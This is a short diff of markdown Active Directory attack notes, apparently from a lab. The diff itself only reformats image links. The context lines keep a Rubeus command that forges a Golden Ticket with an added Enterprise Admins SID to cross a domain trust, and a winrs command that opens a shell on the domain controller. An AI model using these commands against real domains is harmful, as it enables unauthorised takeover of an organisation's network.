@@ -12,12 +12,12 @@ Due to the trust, the parent domain will trust the TGT
 
 Forge the Golden Ticket using Rubeus
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:<comped_DOMAIN> /sid:S-1-5-21-... /sids:S-1-5-21-...-519 /aes256:<hash> /netbios:<DC_name> /ptt`
-![[assets/Pasted image 20260224034621.png]]
-![[assets/Pasted image 20260224034609.png]]
+![Pasted image 20260224034621](assets/Pasted%20image%2020260224034621.png)
+![Pasted image 20260224034609](assets/Pasted%20image%2020260224034609.png)
 
 Access the DC with the Golden Ticket
 `winrs -r:<target_DC_name> cmd`
-![[assets/Pasted image 20260224034652.png]]
+![Pasted image 20260224034652](assets/Pasted%20image%2020260224034652.png)
 
 
 
